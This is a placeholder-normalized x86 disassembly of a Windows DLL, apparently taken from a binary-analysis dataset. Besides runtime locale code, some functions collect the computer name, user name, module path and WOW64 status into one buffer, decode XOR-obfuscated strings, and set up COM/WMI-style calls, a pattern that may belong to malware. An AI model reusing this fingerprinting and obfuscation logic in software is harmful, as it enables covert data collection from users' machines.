cmp [ edi + 0x8 ] 0x0
je r-xdata
and [ edi + 0x8 ] 0x0
jmp r-xdata
push edi
push 0x40
push r--data
call sub_10082fcc
add esp 0xc
test eax eax
je r-xdata
mov esi edi
call sub_100834b6
jmp r-xdata
movzx eax si
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
je r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ edi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
mov esi edi
call sub_1008351d
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov esi edi
call sub_100834b6
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ edi + 0x18 ]
mov [ eax ] cx
mov cx [ edi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] si
xor eax eax
inc eax
jmp r-xdata
mov esi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ edi + 0x18 ]
call esi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_10042442
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ edi + 0x1c ]
call esi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1005aa2b
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_1002f5f6
add esp 0x10
sub_1001c7d0
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002d290
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
mov [ ebp - 0x24 ] esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi 0x104
push edi
lea eax [ esi + 0x124 ]
push eax
push ebx
call [ GetModuleFileNameW@IAT ]
mov [ ebp - 0x1c ] edi
lea ecx [ ebp - 0x1c ]
push ecx
lea edx [ esi + 0x73c ]
push edx
call [ GetComputerNameW@IAT ]
mov [ ebp - 0x20 ] ebx
mov eax [ esi + 0x8 ]
cmp eax 0x6
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
cmp eax 0x5
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x20 ]
mov [ esi + 0xd54 ] ecx
mov [ ebp - 0x1c ] edi
lea edx [ ebp - 0x1c ]
push edx
lea eax [ esi + 0x944 ]
push eax
call [ GetUserNameW@IAT ]
call sub_100320b0
mov [ esi + 0xd58 ] eax
lea ecx [ esi + 0xb4c ]
call sub_100510c0
lea ecx [ esi + 0xd7c ]
push ecx
mov ecx esi
call sub_1004b4b0
lea ecx [ esi + 0xd5c ]
call sub_10071f80
mov [ esi + 0x11b4 ] 0x1
jmp r-xdata
cmp [ esi + 0xc ] 0x1
jbe r-xdata
sub_1001c8f0
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edx [ edi ]
mov edx [ edx + 0x10 ]
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp + 0xa ]
push ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push esi
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call edx
test eax eax
jne r-xdata
cmp eax 0x3
mov eax [ ebp - 0x4 ]
jne r-xdata
lea eax [ ebp + 0xa ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
pop edi
sub eax esi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
mov esi [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jb r-xdata
inc [ ebp - 0x4 ]
cmp esi ebx
je r-xdata
sub_1001c974
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100124be
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1001c9b4
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_1002f56c
push 0xffffffff
push eax
call sub_10054a5a
jmp r-xdata
pop ebp
retn 0x8
sub_1001c9dc
push 0x38
mov eax sub_100857c1
call sub_10047689
mov ebx [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x3c ] 0x0
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp + 0x1c ]
push eax
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
push 0x800
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1006b26d
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x34 ] eax
call sub_1002be90
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x34 ]
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10046885
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x38 ] eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax [ ebp - 0x38 ]
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ ebx ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x4 ] eax
mov eax ebx
call sub_100262c3
retn 0x20
sub_1001caa0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov eax edi
or eax ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
pop edi
xor ecx ecx
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov edi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
sar eax 0x1
cdq
add edi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
mov edi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
sar eax 0x1
cdq
cmp ebx edx
jg r-xdata
test edi edi
jb r-xdata
jl r-xdata
jl r-xdata
sub esi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov eax [ ecx + 0x20 ]
lea edx [ esi + esi ]
add [ eax ] edx
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp edi eax
ja r-xdata
sub esi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
sar esi 0x1
add esi edi
sub [ eax ] esi
mov ecx [ ecx + 0x24 ]
lea edx [ esi + esi ]
add [ ecx ] edx
jmp r-xdata
cmp edi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov esi [ ecx + 0x34 ]
mov edx [ ecx + 0x20 ]
mov esi [ esi ]
mov edx [ edx ]
lea eax [ eax + esi * 2 ]
mov esi [ ecx + 0x24 ]
mov [ esi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
sar eax 0x1
mov [ ecx ] eax
jmp r-xdata
sub_1001cc80
push ebp
mov ebp esp
sub esp 0xac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xff81
and esi 0xff
mov [ ebp + eax * 2 - 0xa8 ] si
inc eax
cmp eax 0x24
jb r-xdata
mov edx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] ax
lea esp [ esp ]
movsx esi [ edx + eax ]
xor esi eax
xor esi 0xff81
and esi 0xff
mov [ ebp + eax * 2 - 0x58 ] si
inc eax
cmp eax 0x24
jb r-xdata
xor edx edx
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] dx
push eax
lea edx [ ebp - 0xa8 ]
call sub_10025b90
mov ecx [ ebp - 0x4 ]
add esp 0x4
neg eax
sbb eax eax
xor ecx ebp
neg eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1001cd1a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
push [ ebp + 0x24 ]
mov edx [ ebp + 0x1c ]
push [ ebp + 0x20 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10084608
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001cd60
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
pop ebp
retn
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006db40
add esp 0x8
sub_1001cd80
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_1002d290
mov eax [ fs : 0x0 ]
push eax
sub esp 0x248
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
mov [ ebp - 0x1c ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov esi [ rw-data ]
mov [ ebp - 0x240 ] esi
xor edx edx
mov [ ebp - 0x238 ] edx
xor eax eax
mov ecx [ r--data ]
movsx edi [ ecx + eax ]
xor edi eax
xor edi 0x40
and edi 0xff
mov [ ebp + eax * 2 - 0x30 ] di
inc eax
cmp eax 0x9
jb r-xdata
xor eax eax
mov [ ebp - 0x1e ] ax
mov [ ebp - 0x4 ] edx
mov ecx [ esi + 0x120 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x234 ] edx
lea ebx [ esi + 0xfa8 ]
mov [ ebp - 0x258 ] ebx
lea eax [ esi + 0xda0 ]
mov [ ebp - 0x248 ] eax
push eax
mov edi [ lstrlenW@IAT ]
call edi
push ebx
mov [ ebp - 0x230 ] eax
call edi
mov ecx [ ebp - 0x230 ]
add ecx eax
mov [ ebp - 0x230 ] ecx
lea ebx [ esi + 0xd7c ]
push ebx
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0xd5c ]
mov [ ebp - 0x250 ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0xb4c ]
mov [ ebp - 0x23c ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0x944 ]
mov [ ebp - 0x244 ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0x73c ]
mov [ ebp - 0x254 ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ esi + 0x124 ]
mov [ ebp - 0x24c ] eax
push eax
call edi
add eax [ ebp - 0x230 ]
mov [ ebp - 0x230 ] eax
lea eax [ ebp - 0x30 ]
push eax
call edi
add eax [ ebp - 0x230 ]
mov ecx [ ebp - 0x234 ]
lea eax [ eax + ecx + 0x104 ]
mov [ ebp - 0x234 ] eax
lea edx [ eax + eax ]
push edx
push 0x8
mov eax [ esi ]
push eax
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x238 ] edi
test edi edi
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xc
call sub_10019570
lea edx [ ebp - 0x22c ]
mov eax 0x26
call sub_10019570
cmp [ esi + 0xd58 ] 0x0
lea ecx [ ebp - 0x3c ]
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
mov eax [ esi + 0x120 ]
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x30 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x258 ]
push edx
mov edx [ ebp - 0x248 ]
push edx
push ebx
mov edx [ ebp - 0x250 ]
push edx
push ecx
mov ecx [ ebp - 0x23c ]
push ecx
mov edx [ ebp - 0x244 ]
push edx
mov ecx [ ebp - 0x254 ]
push ecx
mov edx [ ebp - 0x24c ]
push edx
push eax
lea eax [ ebp - 0x22c ]
push eax
mov ecx [ ebp - 0x234 ]
mov ebx edi
call sub_1006d3c0
add esp 0x2c
jmp r-xdata
mov eax [ eax ]
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
sub_1001cfae
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x238 ]
test eax eax
je r-xdata
xor edi edi
mov [ ebp - 0x238 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x1c ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push eax
push 0x0
mov ecx [ ebp - 0x240 ]
mov edx [ ecx ]
push edx
call [ HeapFree@IAT ]
sub_1001cffa
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_10047236
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_100579de
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_1001b2d2
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_100579de
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_10049cc0
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10047236
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_1005aa2b
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_1001b2d2
pop ecx
inc esi
push esi
push eax
call sub_100579de
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_1001b2d2
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_10047236
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
sub_1001d1d0
push ebp
mov ebp esp
sub esp 0x210
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ eax ]
push ecx
push eax
mov eax [ edx + 0x80 ]
call eax
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x88 ]
push edi
push eax
call edx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x70 ]
push 0x2000
push eax
call edx
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x20c ]
push ecx
mov [ ebp - 0x210 ] 0x208
call [ GetUserNameW@IAT ]
mov eax [ esi + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x78 ]
push 0x0
lea ecx [ ebp - 0x20c ]
push ecx
push eax
call edx
mov [ esi ] eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax [ esi ]
sub_1001d270
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
sub eax 0x0
push edi
je r-xdata
mov ecx [ esi + 0x18 ]
mov edi [ ebp + 0x8 ]
push ecx
push edi
call sub_1006db40
mov edx [ esi + 0x1c ]
push edx
push edi
call sub_1006db40
mov eax [ esi + 0x20 ]
push eax
push edi
call sub_1006db40
add esp 0x18
dec eax
je r-xdata
xor edi edi
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ esi + 0x20 ] edi
jbe r-xdata
sub eax 0x2
jne r-xdata
mov eax [ esi + 0x1c ]
push eax
push ebx
call sub_1006db40
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov edi edi
pop edi
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006db40
add esp 0x8
pop edi
pop esi
pop ebp
retn
inc edi
cmp edi [ esi + 0x20 ]
jb r-xdata
push eax
push ebx
call sub_10044040
add esp 0x8
mov edx [ esi + 0x1c ]
mov eax [ edx + edi * 4 ]
test eax eax
je r-xdata
sub_1001d310
push ebp
mov ebp esp
push 0xffffffff
push sub_100864c1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ ecx + 0x8 ] 0x6
mov eax [ ebp + 0x8 ]
mov esi edx
mov [ ebp - 0xe8 ] eax
jne r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x28
call sub_10019570
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
mov edx 0x32
sub edi ecx
lea ecx [ ecx ]
lea edx [ ebp - 0x40 ]
mov eax 0x1
call sub_10019570
lea eax [ ebp - 0xc4 ]
lea edi [ ebp - 0x40 ]
mov ecx eax
mov edx 0x32
sub edi ecx
mov edi edi
test edx edx
jne r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
xor edx edx
push edx
push edx
mov [ eax ] dx
call [ CoInitializeEx@IAT ]
test eax eax
je r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xc8 ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ edx + 0x7fffffcc ]
test ecx ecx
je r-xdata
jmp r-xdata
lea ecx [ ebp - 0xec ]
push ecx
lea edi [ ebp - 0xc4 ]
call sub_100272b0
mov [ ebp - 0x4 ] 0x0
mov eax [ eax ]
test eax eax
je r-xdata
call [ CoUninitialize@IAT ]
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
xor ecx ecx
mov ecx [ eax ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
test ebx ebx
je r-xdata
mov edi eax
add eax 0x8
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc8 ]
mov edx [ eax ]
lea edi [ ebp - 0xcc ]
push edi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
push eax
mov eax [ edx + 0xc ]
call eax
mov ebx eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0xec ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
push 0x0
push 0x0
push 0x3
push 0x3
push 0x0
push 0x0
push 0xa
push eax
call [ CoSetProxyBlanket@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x4
jmp r-xdata
test edi edi
je r-xdata
lea edi [ ebp - 0xe4 ]
mov eax 0x11
call sub_100693d0
lea eax [ ebp - 0xe0 ]
push eax
mov edi esi
call sub_100272b0
mov edi eax
lea ecx [ ebp - 0xe4 ]
push ecx
lea ebx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x1
call sub_10021390
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x5
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor ecx ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push eax
call [ SysFreeString@IAT ]
xor edx edx
mov edx [ eax ]
jmp r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
push edi
call sub_1000a86e
add esp 0x4
push eax
call sub_10019274
add esp 0x4
lea edx [ ebp - 0x58 ]
mov eax 0x13
call sub_10019570
mov eax [ ebp - 0xd0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
mov eax 0x6
jmp r-xdata
mov eax [ ebp - 0xcc ]
mov esi [ eax ]
lea edi [ ebp - 0xd0 ]
push edi
push 0x0
push 0x30
push ecx
push edx
mov edx [ esi + 0x50 ]
push eax
call edx
lea edi [ ebp - 0xd8 ]
mov ebx eax
call sub_100698c0
lea edi [ ebp - 0xe0 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100698c0
test ebx ebx
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xcc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xc8 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
call [ CoUninitialize@IAT ]
xor eax eax
mov ebx [ VariantClear@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0xd4 ]
mov ecx [ eax ]
push 0x0
push 0x0
lea edx [ ebp - 0xfc ]
push edx
push 0x0
lea edx [ ebp - 0x58 ]
push edx
push eax
mov eax [ ecx + 0x10 ]
call eax
mov eax [ ebp - 0xe8 ]
mov edi [ ebp - 0xf4 ]
mov edx 0x104
sub edi eax
lea esp [ esp ]
test edx edx
jne r-xdata
movzx ecx [ edi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
lea eax [ ebp - 0xfc ]
push eax
call ebx
mov eax [ ebp - 0xd4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0xd0 ]
test eax eax
jne r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0xdc ]
push edx
lea edx [ ebp - 0xd4 ]
push edx
push 0x1
push 0xffffffff
push eax
mov eax [ ecx + 0x10 ]
call eax
cmp [ ebp - 0xdc ] 0x0
mov eax [ ebp - 0xd0 ]
je r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_1001d709
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
push esi
lea eax [ ebp - 0x4c ]
push eax
call [ GetStartupInfoW@IAT ]
push 0x40
push 0x20
pop esi
push esi
call sub_100579de
pop ecx
pop ecx
xor ecx ecx
cmp eax ecx
jne r-xdata
lea edx [ eax + 0x800 ]
mov [ rw-data ] eax
mov [ rw-data ] esi
cmp eax edx
jae r-xdata
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
cmp [ ebp - 0x1a ] cx
je r-xdata
add eax 0x5
pop esi
leave
retn
xor ebx ebx
